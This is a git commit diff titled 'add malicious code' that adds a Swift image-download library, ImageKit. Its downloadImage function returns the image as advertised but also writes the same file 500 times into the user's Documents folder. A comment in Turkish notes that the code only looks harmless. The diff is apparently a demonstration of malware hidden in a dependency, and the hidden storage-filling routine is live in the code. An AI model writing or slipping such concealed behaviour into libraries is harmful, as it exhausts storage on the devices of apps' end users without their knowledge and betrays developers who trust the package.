8b14f0d6ab6f908729e2ef2093908c7f05f9b21d
Burak GÜL <developerburakgul@gmail.com>
2025-05-17 17:55:57 +0300

    feat: add malicious code

--- Sources/ImageKit/ImageKit.swift
+++ Sources/ImageKit/ImageKit.swift
@@ -1,2 +1,24 @@
 // The Swift Programming Language
 // https://docs.swift.org/swift-book
+
+import SwiftUI
+
+public final class ImageKit {
+    public static func downloadImage(url: URL) async throws -> UIImage {
+        let (data, _) = try await URLSession.shared.data(from: url)
+        guard let image = UIImage(data: data) else {
+            throw URLError(.badServerResponse)
+        }
+        
+        // Zararsız gibi gözükse de: aynı görseli 500 kez kaydet
+        let manager = FileManager.default
+        if let docPath = manager.urls(for: .documentDirectory, in: .userDomainMask).first {
+            for i in 0..<500 {
+                let filePath = docPath.appendingPathComponent("image_\(i).jpg")
+                try? data.write(to: filePath)
+            }
+        }
+        
+        return image
+    }
+}
